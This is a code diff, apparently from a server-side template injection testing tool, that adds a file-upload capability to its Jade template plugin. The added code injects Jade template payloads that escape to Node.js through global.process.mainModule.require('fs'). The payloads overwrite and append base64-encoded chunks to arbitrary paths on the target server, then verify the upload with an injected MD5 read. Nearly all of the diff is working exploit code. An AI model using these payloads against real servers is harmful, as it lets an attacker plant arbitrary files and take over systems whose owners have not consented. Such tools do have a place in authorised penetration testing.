@@ -1,8 +1,7 @@
+from utils.strings import quote, chunkit, base64encode, base64decode, md5
 from core.check import Check
 from utils.loggers import log
 from utils import rand
-from utils.strings import quote, base64decode, md5
-import string
 
 class Jade(Check):
 
@@ -76,8 +75,40 @@ class Jade(Check):
 - x = x.mainModule.require
 - y = x('fs')
 - z = x('crypto')
-- y = y.readFileSync('%s').toString()
+- y = y.readFileSync('%s')
 = z.createHash('md5').update(y).digest("hex")
 """ % remote_path
 
         return self.inject(execution_code)
+        
+    def detect_write(self):
+        self.set('write', True)
+    
+    def write(self, data, remote_path):
+        
+        # Check existance and overwrite with --force-overwrite
+        if self._md5(remote_path):
+            if not self.channel.args.get('force_overwrite'):
+                log.warn('Remote path already exists, use --force-overwrite for overwrite')
+                return
+            else:
+                self.inject("""- var x = global.process
+- x = x.mainModule.require
+- y = x('fs')
+- y = y.writeFileSync('%s', '')
+""" % remote_path)
+        
+        # Upload file in chunks of 500 characters
+        for chunk in chunkit(data, 500):
+
+            chunk_b64 = base64encode(chunk)
+            self.inject("""- var x = global.process
+- x = x.mainModule.require
+- y = x('fs')
+- y = y.appendFileSync('%s', Buffer.from('%s', 'base64'), 'binary')
+""" % (remote_path, chunk_b64))
+        
+        if not md5(data) == self._md5(remote_path):
+            log.warn('Remote file md5 mismatch, check manually')
+        else:
+            log.warn('File uploaded correctly')
